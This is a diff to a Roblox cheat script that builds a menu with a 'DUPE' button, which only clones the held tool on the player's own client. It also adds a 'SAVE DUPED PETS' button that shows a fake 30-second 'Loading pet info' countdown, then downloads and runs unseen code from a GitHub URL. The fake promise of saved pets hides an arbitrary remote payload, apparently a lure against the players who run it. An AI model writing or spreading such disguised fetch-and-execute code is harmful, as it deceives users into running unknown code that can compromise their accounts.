@@ -1,11 +1,78 @@
-local Venyx = loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinite-Store/Venyx-UI-Library/main/Venyx.lua"))()
-local ui = Venyx.new("Test UI", 5013109572)
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
 
-local page = ui:CreatePage("Main", 5012544693)
-local section = page:AddSection("Test")
+-- Kavo UI の読み込み
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("2.0 - New Flow", "Ocean")
 
-section:AddLabel("Hello, world!")
+local MainTab = Window:NewTab("Main")
+local MainSection = MainTab:NewSection("Main Controls")
 
-ui:SelectPage(ui.pages[1], true)
+-- ツール表示ラベル（初期化）
+local toolLabel = MainSection:NewLabel("Holding: Nothing")
 
-ui:SelectPage(ui.pages[1], true)
+-- 定期的にツール表示更新
+RunService.RenderStepped:Connect(function()
+	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+	local name = tool and tool.Name or "Nothing"
+	toolLabel:Destroy()
+	toolLabel = MainSection:NewLabel("Holding: " .. name)
+end)
+
+-- Dupe Amount 入力
+local dupeAmount = 1
+MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
+	local number = tonumber(text)
+	if number and number >= 1 and number <= 100 then
+		dupeAmount = number
+	else
+		warn("Enter a number between 1 and 100")
+	end
+end)
+
+-- 複製ボタン
+MainSection:NewButton("DUPE", "Duplicate your tool", function()
+	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+	if not tool then
+		warn("No tool to duplicate.")
+		return
+	end
+	for i = 1, dupeAmount do
+		local clone = tool:Clone()
+		clone.Parent = player.Backpack
+	end
+end)
+
+-- 状態表示（更新可能なように再生成）
+local statusLabel
+local function setStatus(text)
+	if statusLabel then
+		statusLabel:Destroy()
+	end
+	statusLabel = MainSection:NewLabel("SAVE STATUS: " .. text)
+end
+
+setStatus("Ready")
+
+-- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
+MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+	task.spawn(function()
+		for i = 30, 1, -1 do
+			setStatus("⌛ Loading pet info... (" .. i .. "s)")
+			wait(1)
+		end
+
+		setStatus("🚀 Booting...")
+
+		local success, err = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
+		end)
+
+		if success then
+			setStatus("✅ Success!")
+		else
+			setStatus("❌ Error: " .. tostring(err))
+		end
+	end)
+end)
